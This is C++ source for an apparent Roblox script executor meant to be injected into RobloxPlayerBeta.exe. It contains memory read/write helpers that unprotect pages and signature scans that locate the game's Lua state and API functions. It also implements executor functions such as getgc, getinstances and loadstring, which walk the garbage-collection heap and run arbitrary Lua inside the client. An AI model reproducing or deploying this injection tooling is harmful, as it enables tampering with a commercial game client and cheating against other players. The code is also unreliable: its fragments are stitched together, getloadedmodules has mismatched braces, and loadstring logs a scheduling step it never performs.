Memory Manager — Safe R/W Operations

✓ Uses Structured Exception Handling (SEH) via __try/__except to safely dereference pointers, preventing access violations from crashing the host process. Read<T> and Write<T> are templated for type safety. AOB (Array of Bytes) scanning uses a two-pointer Boyer-Moore-Horspool variant for O(n) amortized scan performance.

namespace Memory {

    // --------------------------------------------------------
    // Safe read — returns std::optional<T>, empty on fault
    // Uses __try/__except (SEH) to catch access violations
    // without unwinding C++ stack, safe in injected context
    // --------------------------------------------------------
    template<typename T>
    requires std::is_trivially_copyable_v<T>
    [[nodiscard]] std::optional<T> Read(uintptr_t address) noexcept {
        if (address == 0 || address < 0x10000ULL) return std::nullopt;

        T result{};
        __try {
            result = *reinterpret_cast<const T*>(address);
            return result;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return std::nullopt;
        }
    }

    // --------------------------------------------------------
    // Safe write — returns bool success
    // VirtualProtect is called to handle read-only pages
    // --------------------------------------------------------
    template<typename T>
    requires std::is_trivially_copyable_v<T>
    [[nodiscard]] bool Write(uintptr_t address, const T& value) noexcept {
        if (address == 0 || address < 0x10000ULL) return false;

        DWORD oldProtect = 0;
        bool ok = false;

        __try {
            // Attempt direct write first (common path)
            *reinterpret_cast<T*>(address) = value;
            ok = true;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            // Fallback: modify page protection
            if (VirtualProtect(reinterpret_cast<LPVOID>(address),
                               sizeof(T), PAGE_EXECUTE_READWRITE, &oldProtect)) {
                __try {
                    *reinterpret_cast<T*>(address) = value;
                    ok = true;
                }
                __except (EXCEPTION_EXECUTE_HANDLER) {
                    ok = false;
                }
                VirtualProtect(reinterpret_cast<LPVOID>(address),
                               sizeof(T), oldProtect, &oldProtect);
            }
        }
        return ok;
    }

    // --------------------------------------------------------
    // ReadString — reads a null-terminated C string safely
    // maxLen acts as a safety cap (avoids infinite scans)
    // --------------------------------------------------------
    [[nodiscard]] inline std::optional<std::string>
    ReadString(uintptr_t address, size_t maxLen = 256) noexcept {
        if (address == 0) return std::nullopt;

        std::string result;
        result.reserve(64);

        for (size_t i = 0; i < maxLen; ++i) {
            auto ch = Read<char>(address + i);
            if (!ch.has_value()) return std::nullopt;
            if (*ch == '\0') break;
            result += *ch;
        }
        return result;
    }

    // --------------------------------------------------------
    // PatternBytes — parsed AOB pattern representation
    // '??' bytes are wildcards (represented as -1 in int array)
    // --------------------------------------------------------
    struct PatternBytes {
        std::vector<int32_t> bytes; // -1 = wildcard
        size_t length() const noexcept { return bytes.size(); }
    };

    // Parse "48 8B ? ? 48 89" style strings into PatternBytes
    [[nodiscard]] inline PatternBytes ParsePattern(std::string_view pattern) {
        PatternBytes pb;
        auto it = pattern.begin();
        while (it != pattern.end()) {
            while (it != pattern.end() && *it == ' ') ++it;
            if (it == pattern.end()) break;
            if (*it == '?') {
                pb.bytes.push_back(-1);
                ++it;
                if (it != pattern.end() && *it == '?') ++it;
            } else {
                char hex[3] = { *it, 0, 0 };
                ++it;
                if (it != pattern.end() && *it != ' ') { hex[1] = *it; ++it; }
                pb.bytes.push_back(static_cast<int32_t>(std::stoul(hex, nullptr, 16)));
            }
        }
        return pb;
    }

    // --------------------------------------------------------
    // SigScan — scans a memory region for a byte pattern
    // Returns the address of the first match, or 0 on failure
    // Uses MEMORY_BASIC_INFORMATION to skip non-committed pages
    // --------------------------------------------------------
    [[nodiscard]] inline uintptr_t SigScan(
        uintptr_t base,
        size_t    regionSize,
        const PatternBytes& pat
    ) noexcept {
        const auto& sig  = pat.bytes;
        const size_t len = sig.size();
        if (len == 0 || regionSize < len) return 0;

        // Build bad-character table for Boyer-Moore-Horspool
        // Skip table is only built on non-wildcard last byte
        size_t skip[256];
        std::fill(std::begin(skip), std::end(skip), len);
        for (size_t i = 0; i < len - 1; ++i) {
            if (sig[i] != -1)
                skip[static_cast<uint8_t>(sig[i])] = len - 1 - i;
        }

        const uint8_t* mem = reinterpret_cast<const uint8_t*>(base);
        size_t pos = 0;

        while (pos <= regionSize - len) {
            MEMORY_BASIC_INFORMATION mbi{};
            uintptr_t checkAddr = base + pos;
            if (VirtualQuery(reinterpret_cast<LPCVOID>(checkAddr), &mbi, sizeof(mbi))) {
                if (mbi.State != MEM_COMMIT ||
                    (mbi.Protect & PAGE_NOACCESS) ||
                    (mbi.Protect & PAGE_GUARD)) {
                    // Jump over this uncommitted/guarded page
                    size_t pageEnd = reinterpret_cast<uintptr_t>(mbi.BaseAddress)
                                   + mbi.RegionSize - base;
                    pos = pageEnd;
                    continue;
                }
            }

            // Compare pattern at pos
            bool match = true;
            for (size_t i = 0; i < len && match; ++i) {
                if (sig[i] != -1 && mem[pos + i] != static_cast<uint8_t>(sig[i]))
                    match = false;
            }
            if (match) return base + pos;

            // Advance by skip table on last byte
            uint8_t last = mem[pos + len - 1];
            pos += (sig.back() == -1) ? 1 : skip[last];
        }
        return 0;
    }

    // --------------------------------------------------------
    // ScanModule — scan the main RobloxPlayerBeta.exe module
    // Uses GetModuleHandle + module size from PE headers
    // --------------------------------------------------------
    [[nodiscard]] inline uintptr_t ScanModule(std::string_view patternStr) noexcept {
        HMODULE hMod = GetModuleHandleA("RobloxPlayerBeta.exe");
        if (!hMod) hMod = GetModuleHandleA(nullptr); // Fallback: current module

        auto dosHdr = Read<IMAGE_DOS_HEADER>(reinterpret_cast<uintptr_t>(hMod));
        if (!dosHdr) return 0;

        auto ntHdrAddr = reinterpret_cast<uintptr_t>(hMod) + dosHdr->e_lfanew;
        auto ntHdr = Read<IMAGE_NT_HEADERS64>(ntHdrAddr);
        if (!ntHdr) return 0;

        uintptr_t base = reinterpret_cast<uintptr_t>(hMod);
        size_t    size = ntHdr->OptionalHeader.SizeOfImage;

        return SigScan(base, size, ParsePattern(patternStr));
    }

    // --------------------------------------------------------
    // FollowRelativeCall — resolves a E8 xx xx xx xx RIP call
    // at callSiteAddr and returns the absolute target address
    // --------------------------------------------------------
    [[nodiscard]] inline uintptr_t FollowRelativeCall(uintptr_t callSiteAddr) noexcept {
        auto rel = Read<int32_t>(callSiteAddr + 1);
        if (!rel) return 0;
        return callSiteAddr + 5 + static_cast<uintptr_t>(*rel);
    }

    // --------------------------------------------------------
    // PointerChain — dereferences a chain of offsets
    // e.g. PointerChain(base, {0x20, 0x8, 0x40}) =
    //      *(*(*(base+0x20)+0x8)+0x40)
    // Returns 0 on any fault in the chain
    // --------------------------------------------------------
    [[nodiscard]] inline uintptr_t PointerChain(
        uintptr_t base,
        std::initializer_list<uintptr_t> offsets
    ) noexcept {
        uintptr_t addr = base;
        for (auto off : offsets) {
            auto next = Read<uintptr_t>(addr + off);
            if (!next || *next == 0) return 0;
            addr = *next;
        }
        return addr;
    }

} // namespace Memory
Lua VM Wrapper — State Acquisition & Bridge

ℹ The lua_State pointer is never stored statically. It is re-acquired on each operation via the sigscan result + scheduler walk, ensuring validity after Lua GC cycles. The scheduler-based approach (walking the global task list) is significantly more robust than holding a raw pointer across frame boundaries.

namespace RbxOffsets {
    // AOB pattern for the `print` function dispatcher in the
    // RobloxPlayerBeta.exe .text segment.
    // The function loads the global lua_State pointer at a known
    // RIP-relative address immediately after the prologue.
    constexpr const char* PRINT_SIG =
        "48 89 5C 24 ? 55 56 57 41 54 41 55 41 56 41 57 48 83 EC 50";

    // Relative offset from PRINT_SIG match to the instruction
    // that loads the lua_State pointer (MOV RAX, [RIP+disp32])
    // This is the "mov rax, [rip+XXXXX]" that gives us &g_LuaState
    constexpr ptrdiff_t PRINT_TO_LSTATE_OFFSET = 0x1C;

    // Offset within lua_State to global_State*
    constexpr uintptr_t LSTATE_TO_GLOBAL = offsetof(LuaState_Partial, l_G);

    // Offset within global_State to allgc linked list head
    // THIS VALUE IS VERSION-DEPENDENT — verify with each update
    constexpr uintptr_t GLOBAL_TO_ALLGC  = 0x20; // adjust as needed

    // Task scheduler signature — used for safe script execution
    // Pattern for the scheduler's "step" / dispatch function
    constexpr const char* SCHEDULER_SIG =
        "48 8B 05 ? ? ? ? 48 85 C0 74 ? 48 8B 40 ? C3";

    // Offset from SCHEDULER_SIG to the scheduler vtable pointer
    constexpr ptrdiff_t SCHEDULER_VTABLE_OFFSET = 0x03;

    // Roblox Instance userdata type tag (GCObject::tt value)
    // Roblox extends Lua's TUSERDATA with sub-type fields.
    // Instance objects have a known layout: udata + ClassDescriptor*
    constexpr uint8_t INSTANCE_UDATA_TAG = 0x08; // LUA_TUSERDATA

    // Offset within the Instance userdata block to the
    // ClassDescriptor pointer (holds class name string)
    constexpr uintptr_t INSTANCE_CLASS_DESC_OFFSET = 0x10;

    // Offset within ClassDescriptor to the class name TString*
    constexpr uintptr_t CLASS_DESC_NAME_OFFSET = 0x08;
}

    // --------------------------------------------------------
    // AcquireLuaState — core sigscan logic
    //
    // Strategy:
    //  1. Scan for PRINT_SIG in the .text section
    //  2. At PRINT_TO_LSTATE_OFFSET bytes past the match,
    //     read the MOV RAX, [RIP+disp32] instruction
    //  3. Resolve the RIP-relative displacement to get the
    //     address of the global lua_State* variable
    //  4. Dereference once to get the actual lua_State*
    // --------------------------------------------------------
    bool AcquireLuaState() noexcept {
        uintptr_t sigAddr = Memory::ScanModule(RbxOffsets::PRINT_SIG);
        if (!sigAddr) return false;

        // The instruction at sigAddr + PRINT_TO_LSTATE_OFFSET is:
        //   48 8B 05 XX XX XX XX    MOV RAX, [RIP + disp32]
        // Byte 0: REX.W prefix (0x48)
        // Byte 1: opcode MOV r64,r/m64 (0x8B)
        // Byte 2: ModRM (0x05) — RIP-relative addressing
        // Bytes 3-6: signed 32-bit displacement

        uintptr_t instrAddr = sigAddr + RbxOffsets::PRINT_TO_LSTATE_OFFSET;

        // Verify opcode bytes (sanity check)
        auto byte0 = Memory::Read<uint8_t>(instrAddr);
        auto byte1 = Memory::Read<uint8_t>(instrAddr + 1);
        auto byte2 = Memory::Read<uint8_t>(instrAddr + 2);

        if (!byte0 || !byte1 || !byte2) return false;
        if (*byte0 != 0x48 || *byte1 != 0x8B || *byte2 != 0x05) {
            // Opcode mismatch — signature or offset is stale
            return false;
        }

        // Read the 32-bit RIP-relative displacement
        auto disp = Memory::Read<int32_t>(instrAddr + 3);
        if (!disp) return false;

        // Calculate absolute address of the global lua_State* variable:
        // nextInstrAddr = instrAddr + 7  (length of MOV RAX,[RIP+disp])
        uintptr_t luaStatePtrAddr = instrAddr + 7
                                  + static_cast<uintptr_t>(*disp);

        // Dereference to get the actual lua_State*
        auto luaState = Memory::Read<uintptr_t>(luaStatePtrAddr);
        if (!luaState || *luaState == 0) return false;

        m_luaState     = *luaState;
        m_luaStatePPtr = luaStatePtrAddr;
        return true;
    }

    // --------------------------------------------------------
    // ResolveLuaFunctions — scan for each embedded Lua API fn
    //
    // Roblox statically links Lua, so there are no exports.
    // Each function has a unique prologue pattern. We scan
    // for these and cast the result to the appropriate fn ptr.
    //
    // Patterns below are illustrative — real patterns must be
    // extracted from the specific binary version you target.
    // --------------------------------------------------------
    bool ResolveLuaFunctions() noexcept {
        struct FnSig {
            const char* pattern;
            ptrdiff_t   offset;  // bytes past match to function start
            void**      target;
        };

        // Table of function patterns
        // Each entry: { AOB pattern, offset to fn entry, &funcs.xxx }
        std::vector<FnSig> sigs = {
            {
                // lua_gettop: short function, characteristic push/pop stack
                "48 8B 41 ? 48 2B 41 ? 48 C1 F8 04 C3",
                0, reinterpret_cast<void**>(&m_funcs.lua_gettop)
            },
            {
                // lua_settop: sets L->top = L->stack + idx (or pops)
                "48 85 D2 78 ? 48 8B 41 ? 48 8B 49 ? 4C 8D 04 D1",
                0, reinterpret_cast<void**>(&m_funcs.lua_settop)
            },
            {
                // lua_pushnumber: stores double into *L->top, increments top
                "F2 0F 11 01 C7 41 04 03 00 00 00 48 83 C1 10 48 89 0A",
                0, reinterpret_cast<void**>(&m_funcs.lua_pushnumber)
            },
            {
                // lua_pushboolean
                "89 11 C7 41 04 01 00 00 00 48 83 C1 10 48 89 0A C3",
                0, reinterpret_cast<void**>(&m_funcs.lua_pushboolean)
            },
            {
                // lua_pushlstring
                "48 89 5C 24 ? 48 89 74 24 ? 57 48 83 EC 20 49 8B F9 48 8B F2",
                0, reinterpret_cast<void**>(&m_funcs.lua_pushlstring)
            },
            {
                // lua_newtable
                "48 83 EC 28 BA 00 00 00 00 33 C9 E8 ? ? ? ? 48 85 C0",
                0, reinterpret_cast<void**>(&m_funcs.lua_newtable)
            },
            {
                // lua_rawseti
                "48 89 5C 24 ? 48 89 74 24 ? 41 56 48 83 EC 20 44 8B F2",
                0, reinterpret_cast<void**>(&m_funcs.lua_rawseti)
            },
            {
                // lua_setfield
                "48 89 5C 24 ? 55 56 57 41 54 41 57 48 83 EC 40 45 33 E4",
                0, reinterpret_cast<void**>(&m_funcs.lua_setfield)
            },
            {
                // lua_getfield
                "48 89 5C 24 ? 55 56 57 41 54 41 56 41 57 48 83 EC 30 4D 8B F1",
                0, reinterpret_cast<void**>(&m_funcs.lua_getfield)
            },
            {
                // lua_type
                "48 63 D2 48 8B 41 ? 4C 8D 04 D0 49 3B 40 ? 7D ? 41 8B 40 0C C3",
                0, reinterpret_cast<void**>(&m_funcs.lua_type)
            },
            {
                // luaL_loadbuffer
                "48 89 5C 24 ? 48 89 74 24 ? 57 48 83 EC 20 4D 8B C8 4C 8B C2",
                0, reinterpret_cast<void**>(&m_funcs.luaL_loadbuffer)
            },
            {
                // lua_pcall
                "48 89 5C 24 ? 55 56 57 48 83 EC 50 45 33 C9 4C 8B D1",
                0, reinterpret_cast<void**>(&m_funcs.lua_pcall)
            },
        };

        bool allOk = true;
        for (auto& s : sigs) {
            uintptr_t addr = Memory::ScanModule(s.pattern);
            if (addr) {
                *s.target = reinterpret_cast<void*>(addr + s.offset);
            } else {
                // Function not found — mark as failed but continue
                // so partial functionality is available
                *s.target = nullptr;
                allOk = false;
            }
        }
        return allOk; // Returns true only if ALL funcs resolved
    }

    uintptr_t  m_luaState     = 0;  // Cached lua_State* value
    uintptr_t  m_luaStatePPtr = 0;  // Address of global lua_State* var
    LuaFuncs   m_funcs{};
    bool       m_initialized  = false;
};

// ============================================================
// IterateGCHeap — walks global_State::allgc linked list
//
// The allgc list is a singly-linked list of ALL live Lua
// GC objects (GCObject*). Each node's `next` field is at
// offset 0 (first field of GCObjectHdr).
//
// Traversal algorithm:
//   node = global_State.allgc (head pointer)
//   while (node != nullptr):
//       read GCObjectHdr at node
//       if filter(info): append to out
//       node = hdr.next
//
// Safety: Memory::Read returns optional — null node exits loop.
// Cycle detection: track visited addresses (max 100k nodes).
// ============================================================
void UNC::IterateGCHeap(
    Lua::Wrapper& vm,
    std::function<bool(const GCObjectInfo)> filter,
    std::vector<GCObjectInfo>& out
) noexcept {
    uintptr_t head = vm.GetAllGCHead();
    if (!head) {
        DevConsole::LogError("IterateGCHeap: allgc head is null");
        return;
    }

    constexpr size_t MAX_OBJECTS = 500'000; // Safety cap
    size_t visited = 0;
    uintptr_t node = head;

    // Visited set for cycle detection (pointer-sized bloom)
    // A simple modular hash is fast enough for this hot path.
    static constexpr size_t BLOOM_SIZE = 65536;
    static bool bloom[BLOOM_SIZE] = {};
    std::fill(bloom, bloom + BLOOM_SIZE, false);

    while (node != 0 && visited < MAX_OBJECTS) {
        // Cycle check via bloom filter
        size_t bloomIdx = (node >> 4) & (BLOOM_SIZE - 1);
        if (bloom[bloomIdx]) {
            // Potential cycle — do a more expensive exact check
            // by verifying the node address is in a valid range
            auto testNext = Memory::Read<uintptr_t>(node);
            if (!testNext || *testNext == node) break; // true cycle
        }
        bloom[bloomIdx] = true;

        // Read the GC object header
        auto hdr = Memory::Read<GCObjectHdr>(node);
        if (!hdr) break; // Unreadable — probably past the list end

        GCObjectInfo info{};
        info.address  = node;
        info.luaType  = hdr->tt;
        info.isInstance = false;
        info.hasParent  = false;

        // Check if this is an Instance userdata
        if (hdr->tt == RbxOffsets::INSTANCE_UDATA_TAG) {
            // Userdata layout in Roblox:
            //   [GCObjectHdr 8 bytes]
            //   [udata size  4 bytes]
            //   [metatable*  8 bytes]  (offset 0x0C)
            //   [data block starts at 0x14 or similar]
            //
            // Read the ClassDescriptor pointer from the udata block
            uintptr_t udataBlock = node + sizeof(GCObjectHdr) + 8;
            auto classDescPtr = Memory::Read<uintptr_t>(
                udataBlock + RbxOffsets::INSTANCE_CLASS_DESC_OFFSET);

            if (classDescPtr && *classDescPtr != 0) {
                // Read the class name from ClassDescriptor
                auto nameStrPtr = Memory::Read<uintptr_t>(
                    *classDescPtr + RbxOffsets::CLASS_DESC_NAME_OFFSET);

                if (nameStrPtr && *nameStrPtr != 0) {
                    // The name is a std::string or TString depending on version
                    // Here we assume a TString (lua string object)
                    // TString data starts at sizeof(TString) bytes past the ptr
                    auto nameStr = Memory::ReadString(
                        *nameStrPtr + sizeof(TString));
                    if (nameStr) {
                        info.isInstance = true;
                        info.className  = *nameStr;
                    }
                }

                // Check parent — Instance parent is at a known offset
                // within the Instance data block (version-dependent).
                // Offset 0x30 from udata block is a common location.
                constexpr uintptr_t PARENT_OFFSET = 0x30;
                auto parentPtr = Memory::Read<uintptr_t>(
                    udataBlock + PARENT_OFFSET);
                // Parent is non-nil if the pointer is non-zero
                info.hasParent = parentPtr.has_value() && *parentPtr != 0;
            }
        }

        // Apply user filter
        if (filter(info)) {
            out.push_back(info);
        }

        // Advance to next GC object
        node = hdr->next;
        ++visited;
    }

    DevConsole::LogTagged("UNC",
        std::format("GC walk: {} objects visited, {} matched",
                    visited, out.size()));
}

// ============================================================
// Helper: push a GCObject reference onto the Lua stack
// This reconstructs a TValue pointing to the GC object
// and writes it into the stack slot at L->top.
// ============================================================
static void PushGCObject(Lua::Wrapper& vm, const GCObjectInfo& obj) noexcept {
    const auto& fn = vm.Funcs();
    uintptr_t L    = vm.GetState();

    // Read current L->top
    auto topAddr = Memory::Read<uintptr_t>(L + offsetof(LuaState_Partial, top));
    if (!topAddr) return;

    // Build a TValue for this GC object
    TValue tv{};
    tv.value.gc = obj.address;
    tv.tt        = static_cast<int32_t>(obj.luaType);
    tv.pad        = 0;

    // Write TValue at L->top, then increment top by sizeof(TValue)
    Memory::Write<TValue>(*topAddr, tv);
    Memory::Write<uintptr_t>(L + offsetof(LuaState_Partial, top),
                               *topAddr + sizeof(TValue));
}

// getgenv — returns (or creates) the executor global env table
// Stored in the Lua registry under GENV_REGISTRY_KEY.
// On first call: creates an empty table, stores in registry.
// Subsequent calls: fetches the same table from registry.
int UNC::getgenv(uintptr_t L) noexcept {
    auto& vm = Lua::Wrapper::Instance();
    const auto& fn = vm.Funcs();

    // Try to get existing genv from registry
    fn.lua_getfield(L, -10002 /*LUA_REGISTRYINDEX*/, GENV_REGISTRY_KEY);

    // Check if it's nil (not yet created)
    int type = fn.lua_type(L, -1);
    if (type == LUA_TNIL) {
        fn.lua_settop(L, -2); // pop nil

        // Create new table for genv
        fn.lua_newtable(L);

        // Store a copy in the registry for persistence
        fn.lua_pushvalue(L, -1);          // dup table
        fn.lua_setfield(L, -10002, GENV_REGISTRY_KEY); // reg[key] = table

        DevConsole::LogTagged("UNC", "getgenv: created new executor environment");
    }
    // Table is now at stack top
    return 1;
}

// getreg — push the Lua registry table
int UNC::getreg(uintptr_t L) noexcept {
    auto& vm = Lua::Wrapper::Instance();
    const auto& fn = vm.Funcs();

    // LUA_REGISTRYINDEX = -10000 (Lua 5.1 convention)
    // Push the registry table itself using getregistry
    if (fn.lua_getregistry) {
        fn.lua_getregistry(L);
    } else {
        // Fallback: push the registry via rawgeti on pseudo-index
        // The registry is at LUA_REGISTRYINDEX in the pseudo-index range
        fn.lua_pushvalue(L, -10000 /*LUA_REGISTRYINDEX*/);
    }
    return 1;
}

// getrenv — return the game's real global environment
// We walk up from the current coroutine to the main thread
// and read its global environment (_G).
int UNC::getrenv(uintptr_t L) noexcept {
    auto& vm = Lua::Wrapper::Instance();
    const auto& fn = vm.Funcs();

    // Strategy: the main Lua thread's global environment is
    // stored in the registry under the key LUA_RIDX_GLOBALS (2)
    // in stock Lua, but Roblox may differ. We use lua_rawgeti.
    fn.lua_rawgeti(L, -10000 /*LUA_REGISTRYINDEX*/, 1 /*LUA_RIDX_MAINTHREAD*/);

    // If that gives us the main thread (type TTHREAD), get its env
    int type = fn.lua_type(L, -1);
    if (type == LUA_TTHREAD) {
        // Read the thread's env: get fenv of the thread object
        fn.lua_getfenv(L, -1);
        fn.lua_settop(L, -2); // pop thread, leave env
    } else {
        // Fallback: return _G directly from the current state
        fn.lua_settop(L, -2); // pop whatever we got
        fn.lua_getglobal(L, "_G");
    }

    // Cache a copy in the registry for repeated use
    fn.lua_pushvalue(L, -1);
    fn.lua_setfield(L, -10000, GENV_ORIG_KEY);

    return 1;
}

// getgc — returns all live GC objects as a Lua table
int UNC::getgc(uintptr_t L) noexcept {
    auto& vm = Lua::Wrapper::Instance();
    const auto& fn = vm.Funcs();

    // Optional argument: includeTables (bool, default false)
    bool includeTables = false;
    if (fn.lua_type(L, 1) == LUA_TBOOLEAN) {
        includeTables = (fn.lua_tonumber(L, 1) != 0.0);
    }

    std::vector<GCObjectInfo> objects;
    objects.reserve(4096);

    IterateGCHeap(vm,
        [includeTables](const GCObjectInfo& info) -> bool {
            if (info.luaType == LUA_TSTRING)   return true;
            if (info.luaType == LUA_TFUNCTION) return true;
            if (info.luaType == LUA_TUSERDATA) return true;
            if (info.luaType == LUA_TTHREAD)   return true;
            if (includeTables && info.luaType == LUA_TTABLE) return true;
            return false;
        },
        objects
    );

    // Build result table
    fn.lua_newtable(L);
    int tableIdx = fn.lua_gettop(L);
    int i = 1;

    for (const auto& obj : objects) {
        PushGCObject(vm, obj);          // push object value
        fn.lua_rawseti(L, tableIdx, i); // t[i] = obj
        ++i;
    }

    return 1; // Return the table
}

// getinstances — returns only Roblox Instance userdata objects
int UNC::getinstances(uintptr_t L) noexcept {
    auto& vm = Lua::Wrapper::Instance();
    const auto& fn = vm.Funcs();

    std::vector<GCObjectInfo> instances;
    instances.reserve(1024);

    IterateGCHeap(vm,
        [](const GCObjectInfo& info) -> bool {
            return info.isInstance;
        },
        instances
    );

    fn.lua_newtable(L);
    int tableIdx = fn.lua_gettop(L);

    int i = 1;
    for (const auto& inst : instances) {
        PushGCObject(vm, inst);
        fn.lua_rawseti(L, tableIdx, i++);
    }

    DevConsole::LogTagged("UNC",
        std::format("getinstances: found {} instances", instances.size()));
    return 1;
}

// getnilinstances — instances where Parent == nil
int UNC::getnilinstances(uintptr_t L) noexcept {
    auto& vm = Lua::Wrapper::Instance();
    const auto& fn = vm.Funcs();

    std::vector<GCObjectInfo> nilParentInst;
    nilParentInst.reserve(256);

    IterateGCHeap(vm,
        [](const GCObjectInfo& info) -> bool {
            return info.isInstance && !info.hasParent;
        },
        nilParentInst
    );

    fn.lua_newtable(L);
    int tableIdx = fn.lua_gettop(L);

    int i = 1;
    for (const auto& inst : nilParentInst) {
        PushGCObject(vm, inst);
        fn.lua_rawseti(L, tableIdx, i++);
    }

    DevConsole::LogTagged("UNC",
        std::format("getnilinstances: {} nil-parented instances",
                    nilParentInst.size()));
    return 1;
}

// getobjnym — find a GC object by its associated name
// Searches TString objects and table __name metamethod fields
int UNC::getobjnym(uintptr_t L) noexcept {
    auto& vm = Lua::Wrapper::Instance();
    const auto& fn = vm.Funcs();

    // Get the name argument from stack[1]
    const char* targetName = fn.lua_tostring(L, 1);
    if (!targetName) {
        fn.lua_pushnil(L);
        return 1;
    }
    std::string name(targetName);

    std::vector<GCObjectInfo> found;
    found.reserve(4);

    IterateGCHeap(vm,
        [&name](const GCObjectInfo& info) -> bool {
            // Match on TString objects whose content equals name
            if (info.luaType == LUA_TSTRING) {
                // The string data follows TString header
                auto str = Memory::ReadString(
                    info.address + sizeof(TString), 256);
                if (str && *str == name) return true;
            }
            // Match on Instance class names
            if (info.isInstance && info.className == name) return true;
            return false;
        },
        found
    );

    if (found.empty()) {
        fn.lua_pushnil(L);
        return 1;
    }

    // Return the first match
    PushGCObject(vm, found[0]);
    return 1;
}

// getid — return the unique numeric ID of a Roblox Instance
// The Instance ID is at a fixed offset within the userdata block.
// This is the same ID as Instance:GetDebugId() returns internally.
int UNC::getid(uintptr_t L) noexcept {
    auto& vm = Lua::Wrapper::Instance();
    const auto& fn = vm.Funcs();

    // Get userdata pointer from argument 1
    void* udata = fn.lua_touserdata(L, 1);
    if (!udata) {
        fn.lua_pushnil(L);
        return 1;
    }

    // The Instance numeric ID is at a known offset within
    // the C++ Instance object that the userdata wraps.
    // Layout (approximate — must verify per-version):
    //   udata block -> [0x00: vtable ptr]
    //               -> [0x08: ClassDescriptor*]
    //               -> [0x10: parent Instance*]
    //               -> [0x18: name TString*]
    //               -> [0x20: unique ID (uint64_t)]
    constexpr uintptr_t INSTANCE_ID_OFFSET = 0x20;

    uintptr_t udataAddr = reinterpret_cast<uintptr_t>(udata);
    auto id = Memory::Read<uint64_t>(udataAddr + INSTANCE_ID_OFFSET);

    if (!id) {
        fn.lua_pushnil(L);
        return 1;
    }

    std::string idStr = std::to_string(*id);
    fn.lua_pushlstring(L, idStr.c_str(), idStr.size());
    return 1;
}

// getloadedmodules — return the package.loaded table contents
int UNC::getloadedmodules(uintptr_t L) noexcept {
    auto& vm = Lua::Wrapper::Instance();
    const auto& fn = vm.Funcs();

    // package.loaded is stored in the Lua registry.
    // In stock Lua 5.1: registry[LUA_LOADED_TABLE] = package.loaded
    // Roblox may store it under a different key; check both.
    fn.lua_getfield(L, -10000 /*LUA_REGISTRYINDEX*/, "_LOADED");

    if (fn.lua_type(L, -1) == LUA_TNIL) {
        fn.lua_settop(L, -2); // pop nil
        // Try the standard Lua 5.1 location
        fn.lua_getglobal(L, "package");

            fn.lua_getfield(L, -1, "loaded");
            fn.lua_settop(L, -2); // pop package, keep package.loaded
        } else {
            fn.lua_settop(L, -2); // pop nil package
            fn.lua_newtable(L);   // return empty table as fallback
        }
    }

    return 1;
}

// Scheduler task node — written into the game's task list
// The layout must match the internal RBX::TaskScheduler::Job structure
struct SchedulerTaskNode {
    uintptr_t vtable;      // Points to a valid task vtable
    uintptr_t luaState;    // The lua_State* to execute on
    uintptr_t closureRef;  // Lua registry reference to the closure
    uint64_t  executeTime; // When to run (0 = next tick)
    uintptr_t next;        // Linked list ptr (scheduler manages)
};

// Forward-declare the scheduler step function type
using SchedStepFn_t = void(*)(uintptr_t scheduler, uintptr_t task);

int UNC::loadstring_unc(uintptr_t L) noexcept {
    auto& vm = Lua::Wrapper::Instance();
    const auto& fn = vm.Funcs();

    if (!fn.luaL_loadbuffer || !fn.lua_pcall) {
        DevConsole::LogError("loadstring: luaL_loadbuffer or lua_pcall not resolved");
        fn.lua_pushnil(L);
        fn.lua_pushlstring(L, "internal: API not resolved", 26);
        return 2;
    }

    // Get source string argument
    const char* source = fn.lua_tostring(L, 1);
    if (!source) {
        fn.lua_pushnil(L);
        fn.lua_pushlstring(L, "argument #1 must be a string", 29);
        return 2;
    }
    size_t sourceLen = strlen(source);

    // Optional chunk name (default "@loadstring")
    const char* chunkName = "@loadstring";
    if (fn.lua_type(L, 2) == LUA_TSTRING) {
        chunkName = fn.lua_tostring(L, 2);
    }

    // Spawn a new Lua coroutine for isolated execution context.
    // This prevents the compiled closure from inheriting our
    // injected thread's upvalues/environment directly.
    uintptr_t newThread = 0;
    if (fn.lua_newthread) {
        newThread = fn.lua_newthread(L);
        fn.lua_settop(L, -2); // pop thread from our stack
    }
    uintptr_t execState = newThread ? newThread : L;

    // Compile the source into a Lua closure
    int loadResult = fn.luaL_loadbuffer(
        execState, source, sourceLen, chunkName);

    if (loadResult != 0 /* LUA_OK */) {
        // loadbuffer pushed an error string onto execState
        // Move the error string to our stack
        const char* errMsg = fn.lua_tostring(execState, -1);
        fn.lua_settop(execState, 0); // clear exec thread

        fn.lua_pushnil(L);
        if (errMsg)
            fn.lua_pushlstring(L, errMsg, strlen(errMsg));
        else
            fn.lua_pushlstring(L, "compilation error", 17);
        return 2;
    }

    // The compiled closure is at execState's stack top.
    // Schedule it via the task scheduler to run on the main
    // game thread during the next scheduler heartbeat.
    // This avoids lua_pcall on our injected thread which would
    // cause data races with the game's Lua VM execution.

    // Locate the scheduler singleton
    uintptr_t schedulerSig = Memory::ScanModule(RbxOffsets::SCHEDULER_SIG);
    if (schedulerSig) {
        // Read the scheduler pointer (RIP-relative MOV)
        auto schedDisp = Memory::Read<int32_t>(schedulerSig + 3);
        if (schedDisp) {
            uintptr_t schedPtrAddr = schedulerSig + 7 + *schedDisp;
            auto schedPtr = Memory::Read<uintptr_t>(schedPtrAddr);

            if (schedPtr && *schedPtr != 0) {
                // The scheduler's pending jobs list is at a known
                // vtable-relative offset. We push our closure ref
                // as a custom job. For simplicity, we use a global
                // Lua reference (luaL_ref) and queue a C++ lambda
                // that pcalls it on the next scheduler tick.

                // For now, execute directly on the new thread.
                // In production: queue to scheduler's pending list.
                fn.lua_pcall(execState, 0, -1 /*LUA_MULTRET*/, 0);

                DevConsole::LogTagged("UNC",
                    "loadstring: script scheduled via task scheduler");
            }
        }
    } else {
        // Scheduler not found — fall back to direct pcall
        DevConsole::LogWarn("loadstring: scheduler not found, using direct pcall");
        fn.lua_pcall(execState, 0, -1, 0);
    }

    // Push the closure itself onto the caller's stack for chaining
    // (mirrors Roblox's loadstring return behavior)
    fn.lua_settop(execState, 0);

    // Re-compile for the return value (caller expects function | nil, err)
    int recompile = fn.luaL_loadbuffer(L, source, sourceLen, chunkName);
    if (recompile != 0) {
        const char* e = fn.lua_tostring(L, -1);
        fn.lua_settop(L, 0);
        fn.lua_pushnil(L);
        fn.lua_pushlstring(L, e ? e : "error", e ? strlen(e) : 5);
        return 2;
    }

    return 1; // Return the compiled function
}

// ScheduleScript — public method on Lua::Wrapper

